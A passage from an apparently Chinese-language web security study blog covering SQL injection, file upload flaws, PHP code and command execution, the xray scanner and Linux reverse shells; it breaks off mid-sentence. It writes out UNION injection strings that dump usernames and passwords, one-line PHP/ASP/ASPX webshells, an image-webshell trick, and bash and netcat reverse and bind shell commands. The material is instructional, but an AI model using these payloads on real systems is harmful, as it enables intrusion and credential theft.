src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823215104388.png" alt="image-20230823215104388"></p></li><li><p>获取表中的所有字段</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;”users” –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823215745818.png" alt="image-20230823215745818"></p></li><li><p>获取数据</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(username),group_concat(password)  from users–+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823220144076.png" alt="image-20230823220144076"></p><p>得到用户和密码，完成漏洞的挖掘</p></li></ul><h3 id="others知识点"><a href="#others知识点" class="headerlink" title="others知识点"></a>others知识点</h3><p>  concat、concat_ws、group_concat 区别  </p><ol><li><p>concat</p><ul><li><p>作用：将多个字符串连接在一起</p></li><li><p>语法：concat(str1,str2,…)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823220918700.png" alt="image-20230823220918700"></p></li></ul></li><li><p>concat_ws</p><ul><li><p>作用：  和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就  是concat with separator）  </p></li><li><p>语法：concat_ws(separator, str1, str2, …)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823221124017.png" alt="image-20230823221124017"></p></li></ul></li><li><p>group_concat</p><ul><li>作用：  将group by产生的同一个分组中的值连接起来，返回一个字符串结果。  </li><li>语法：group_concat(  [distinct] 要连接的字段  [order by 排序字段 asc&#x2F;desc  ]  [separator ‘分隔符’] )</li></ul></li></ol><h2 id="web安全-文件上传"><a href="#web安全-文件上传" class="headerlink" title="web安全-文件上传"></a>web安全-文件上传</h2><h3 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h3><p>  将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端  硬盘上作为真实的文件保存。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824172423642.png" alt="image-20230824172423642"></p><p>  通常一个文件以HTTP协议进行上传时，将以<em><strong>POST</strong></em>请求发送至Web服务器，Web服务器收到请求并同  意后，用户与Web服务器将建立连接，并传输数据。  </p><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>  <strong>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的  能力</strong>。这种攻击方式是最为直接和有效的，”文件上传”本身没有问题，有问题的是文件上传后，服务  器怎么处理、解释文件。如果服务器端脚本语言未对上传的文件进行严格的验证和过滤，就容易造成  上传任意文件的情况。  </p><p>  通常 Web 站点会有用户注册功能，<strong>而当用户登录之后大多数情况下会存在类似头像上传、附件上传之  类的功能</strong>，这些功能点往往存在上传验证方式不严格的安全缺陷，导致攻击者通过各种手段绕过验  证，上传非法文件，这是在web渗透中非常关键的突破口。  </p><h3 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824173033394.png" alt="image-20230824173033394"></p><h3 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h3><p>  WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称之  为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目  录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控  </p><p>制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）</p><h4 id="常用的一句话webshell"><a href="#常用的一句话webshell" class="headerlink" title="常用的一句话webshell"></a>常用的一句话webshell</h4><blockquote><p>  php一句话木马： <strong><?php** @**eval**($_POST[value]);**?></strong>  </p><p>asp一句话木马： &lt;%**eval** **request**(“value”)%&gt;  </p><p>aspx一句话木马： &lt;%@  Page Language&#x3D;”Jscript”%&gt;&lt;%**eval**(Request.Item[“value”])%&gt;  </p></blockquote><p>  制作一句话图片马：copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg  </p><h3 id="webshell原理"><a href="#webshell原理" class="headerlink" title="webshell原理"></a>webshell原理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php的代理需要写在<?php ?>里面</p><p>@是不要报错</p><p>  php里面有几个超全局变量，$ _GET、$ _POST就是其中之一，意思是用 post 的方法接收变量  cmd传递来的字符。  </p><p><code>eval()</code>把字符作为php执行</p><p><code>exec()</code>执行外部的命令，并且返回结果</p><p><code>system()</code>执行系统的命令</p><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="绕过客户端检测-JS检测"><a href="#绕过客户端检测-JS检测" class="headerlink" title="绕过客户端检测(JS检测)"></a>绕过客户端检测(JS检测)</h4><p>  原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和  </p><p>  扩展名是否合法。  </p><p>  方法：在本地浏览器客户端禁用JS即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实  </p><p>现，利用burpsuite可以绕过一切客户端检测。</p><h4 id="绕过服务端检测"><a href="#绕过服务端检测" class="headerlink" title="绕过服务端检测"></a>绕过服务端检测</h4><ol><li><p>服务端检测</p><p>  服务端的代码通常检测三个点：MIME类型、文件内容、文件后缀  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174352849.png" alt="image-20230824174352849"></p></li><li><p>绕过MIME类型检测</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174429113.png" alt="image-20230824174429113"></p><p>  原理：检测图片类型文件上传过程中http包的Content-Type字段的值，来判断上传文件是否合法。  方法：用burpsuite截取并修改数据包中文件的content-type类型进行绕过。  </p></li><li><p>绕过文件后缀检测-黑名单  </p><p>黑名单策略：</p></li></ol><p>   文件扩展名在黑名单中为不合法，一般有个专门的黑名单列表，里面会包含常见的危险脚本文件。</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174532010.png" alt="image-20230824174532010"></p><ul><li><p>后缀大小写绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174606203.png" alt="image-20230824174606203"></p></li></ul><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174709369.png" alt="image-20230824174709369"></p><h4 id="绕过文件后缀检测"><a href="#绕过文件后缀检测" class="headerlink" title="绕过文件后缀检测"></a>绕过文件后缀检测</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174904343.png" alt="image-20230824174904343"></p><h4 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175119627.png" alt="image-20230824175119627"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175154589.png" alt="image-20230824175154589"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175215369.png" alt="image-20230824175215369"></p><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><h4 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175418574.png" alt="image-20230824175418574"></p><h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175548147.png" alt="image-20230824175548147"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175602580.png" alt="image-20230824175602580"></p><h4 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175700733.png" alt="image-20230824175700733"></p><h4 id="IIS-7-0-x2F-7-5解析漏洞"><a href="#IIS-7-0-x2F-7-5解析漏洞" class="headerlink" title="IIS 7.0&#x2F;7.5解析漏洞"></a>IIS 7.0&#x2F;7.5解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175744058.png" alt="image-20230824175744058"></p><h2 id="web安全-命令执行"><a href="#web安全-命令执行" class="headerlink" title="web安全-命令执行"></a>web安全-命令执行</h2><h3 id="命令执行的漏洞简介"><a href="#命令执行的漏洞简介" class="headerlink" title="命令执行的漏洞简介"></a>命令执行的漏洞简介</h3><ol><li><p>原因</p><p>因为没有对用户输入没有严格的过滤，导致用户的输入当作命令</p></li><li><p>危害</p><ul><li><p>继承web服务器的权限去执行命令</p></li><li><p>反弹shell</p><p>获得目标服务器的权限</p></li><li><p>进一步内网渗透</p><p>可以远程执行代码</p><p>  因为业务需求，在PHP中有时需要调用一些执行命令的函数，如：**eval()、assert()、  preg_replace()、create_function()**等，如果存在一个使用这些函数且未对可被用户控制的参数  </p><p>进行检查过滤的页面，那么这个页面就可能存在远程代码执行漏洞。</p></li></ul></li></ol><h3 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h3><ol><li><p>eval()</p><p>把字符串作为代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span> (<span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  注意：eval() 函数传入的参数必须为PHP代码，即要以分号结尾；  </p><p>  函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供  的、未经完整验证过的数据 。  </p></li><li><p>assert()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> ] )<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  检查一个断言是否为 FALSE  </p><p>注意：assert()函数是直接将传入的参数当成PHP代码执行，不需要以分号结尾</p></li><li><p>call_user_func  ()</p></li></ol>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] )<br></code></pre></td></tr></table></figure>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-comment">//传入的参数作为assert函数的参数</span><br><span class="hljs-comment">//cmd=system(whoami)</span><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><ol start="4"><li>call_user_func_array</li></ol>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func_array</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$param_arr</span> )<br></code></pre></td></tr></table></figure>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-comment">//将传入的参数作为数组的第一个值传递给assert函数</span><br><span class="hljs-comment">//cmd=system(whoami)</span><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><pre><code class="hljs"> 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传  入。  </code></pre><p>   调用回调函数，并把一个数组参数作为回调函数的参数</p><h3 id="系统命名执行"><a href="#系统命名执行" class="headerlink" title="系统命名执行"></a>系统命名执行</h3><p>  一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们  常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界  面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。  而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶  意命令，让后台进行执行，从而获得后台服务器权限。  </p><p>  利用PHP 的系统命令执行函数来调用系统命令并执行，这类函数有 system()、exec()、shell_exec()、  passthru()、penti_exec()、popen()、proc_pen()等，此外还有反引号命令执行，这种方式实际上是调  用 shell_exec()函数来执行。  </p><h3 id="php系统命令执行函数"><a href="#php系统命令执行函数" class="headerlink" title="php系统命令执行函数"></a>php系统命令执行函数</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230825001713621.png" alt="image-20230825001713621"></p><p>php提供的专门执行外部命令的函数</p><blockquote><p>exec()</p><p>system()</p><p>passthru()</p><p>shell_exec()</p></blockquote><ol><li>exec  ()</li></ol>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$command</span> [, <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$output</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$return_var</span> ]] )<br></code></pre></td></tr></table></figure><pre><code class="hljs"> 执行一个外部程序，exec() 执行 command 参数所指定的命令。   exec执行系统外部命令时**不会输出结果**，而是返回结果的最后一行。如果想得到结果，可以使用第二  个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。即如果输出结果有20行，则这个  数组就有20条记录，所以如果需要反复输出调用不同系统外部命令的结果，最好在输出每一条系统外  部命令结果时清空这个数组unset($output)，以防混乱。第三个参数用来取得命令执行的状态码，  通常执行成功都是返回0。  </code></pre>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-comment">// echo exec(&#x27;whoami&#x27;);</span><br><span class="hljs-comment">// exec(&#x27;ls -la&#x27;, $return);</span><br><span class="hljs-comment">// var_dump($return);</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];  <span class="hljs-comment"># 获取参数给cmd</span><br>@<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$return</span>);  <span class="hljs-comment">#调用函数</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$return</span>) <span class="hljs-comment"># 输出数组</span><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><ol start="2"><li><p>system()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$command</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$return_var</span> ] )<br></code></pre></td></tr></table></figure><p>  函数执行 command 参数所指定的命令， 并且输出执行结果。  </p><p>  system和exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令  </p><p>成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span><br><span class="hljs-comment">// 并且将输出的最后一样内容返回到 $last_line。</span><br><span class="hljs-comment">// 将命令的返回值保存到 $retval。</span><br><span class="hljs-variable">$last_line</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-variable">$retval</span>);<br><span class="hljs-comment">// 打印更多信息</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;/pre&gt;</span><br><span class="hljs-string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="hljs-variable">$last_line</span> . <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="hljs-variable">$retval</span>;<br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="命令常用的特殊字符"><a href="#命令常用的特殊字符" class="headerlink" title="命令常用的特殊字符"></a>命令常用的特殊字符</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230825002853984.png" alt="image-20230825002853984"></p><h2 id="web安全-漏洞扫描器"><a href="#web安全-漏洞扫描器" class="headerlink" title="web安全-漏洞扫描器"></a>web安全-漏洞扫描器</h2><h3 id="XRAY"><a href="#XRAY" class="headerlink" title="XRAY"></a>XRAY</h3><p>  xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，主要特性有:  </p><blockquote><p>检测速度快：发包速度快; 漏洞检测算法高效。  </p><p>支持范围广：大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。  </p><p>代码质量高：编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代  码可靠性。  </p><p>高级可定制：通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。  </p><p>安全无威胁：xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和  poc 均为无害化检查。</p></blockquote><ol><li><p>爬虫模式</p><blockquote><p>  <em>#</em> 完整  </p><p>  xray.exe webscan –basic-crawler  <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> –html-outputvulnweb.com-1.html</p><p>  <em>#</em> 简化  </p><p>xray.exe ws –basic <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> –ho vulnweb.com-2.html</p></blockquote></li><li><p>被动扫描</p><ul><li><p>生成CA证书</p><blockquote><p>xray.exe genca</p></blockquote></li><li><p>浏览器代理</p></li><li></li></ul></li></ol><h2 id="web安全-linux反弹shell"><a href="#web安全-linux反弹shell" class="headerlink" title="web安全-linux反弹shell"></a>web安全-linux反弹shell</h2><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>  文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件  文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容  在Linux系统中内核默认为每个进程创建三个标准的文件描述符：0（标准输入）、1（标准输出）、2（标准错误）</p><p>  通过查看 <code>/proc/PID/fd </code>目录下的文件，就可以查看每个进程拥有的所有文件描述符  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png" alt="image-20230826090524816"></p><p>255是一个小技巧，bash用于在重定向时保留这些副本</p><p>当打开文件时，系统内核会为特定的进程自动创建对应的文件描述符，也就是说每一个进程的输入输出error不一样，不同的进程打开同一个文件时，它们的文件描述符可能不同，但同一个进程打开同一个文件时，它们的文件描述符是相同的。</p><h3 id="linux文件描述符操作"><a href="#linux文件描述符操作" class="headerlink" title="linux文件描述符操作"></a>linux文件描述符操作</h3><p>以下操作只针对某一个进程</p><ol><li><p>更改标准输出位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 1&gt; test<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091742826.png" alt="image-20230826091742826"></p></li><li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091803283.png" alt="image-20230826091803283"></p></li><li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091837807.png" alt="image-20230826091837807"></p></li><li><p>&#x2F;dev&#x2F;null</p><p>特殊文件，写入的任何东西都会被清空</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091936362.png" alt="image-20230826091936362"></p></li></ol><h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><p>bash反弹shell，只针对bash</p><p>由于外网机无法访问到内网机，但是内网机能ping外网机，于是使用反弹shell的方式，帮助外网机获得内网机的shell得到</p><p>反弹shell，就是可以理解为，外网可以执行内网机的shell，这里是bash</p><p>第一步首先让控制端监听端口</p><blockquote><p>nc -lvvp 6666（端口）</p></blockquote><p>第二步</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;被控端ip&#x2F;与控制端相同的端口 0&gt;&amp;1</p></blockquote><p>0&gt;&amp;1的意思是，本地的输出也输出给控制端，有点像发送信息</p><p>参数讲解</p><blockquote><p>  bash -i  打开一个交互式的bash shell。  </p><p>  &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT  </p><p>  &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash  实现的用来实现网络请求的一个接口。  打开这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket  连接中传输数据。  </p><p>  &#x2F;dev&#x2F;tcp&#x2F;192.168.81.154&#x2F;6666  </p><p>和192.168.81.154的6666端口建立TCP连接</p></blockquote><h3 id="Linux反弹shell的方法"><a href="#Linux反弹shell的方法" class="headerlink" title="Linux反弹shell的方法"></a>Linux反弹shell的方法</h3><h4 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h4><ol><li><p>NC正向反弹</p><p>正向的意思，由控制端主动发出请求，用于控制端能连接上被控端就行</p><p>但是注意有可能nc不支持-e参数</p><blockquote><p>  被控端：  </p><p>  nc -lvvp 6666 -e &#x2F;bin&#x2F;sh  </p><p>  控制端：  </p><p>  nc 10.10.1.7 6666  </p><p>  原  </p><p>  理：  </p><p>  被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111509035.png" alt="image-20230826111509035"></p></li><li><p>NC反向shell</p><p>当被控端能够访问控制端的时候使用</p><blockquote><p>  控制端：  </p><p>  nc -lvvp 6666  </p><p>  被控端：  </p><p>  nc -e &#x2F;bin&#x2F;sh 10.10.1.11 6666  </p><p>  原理：  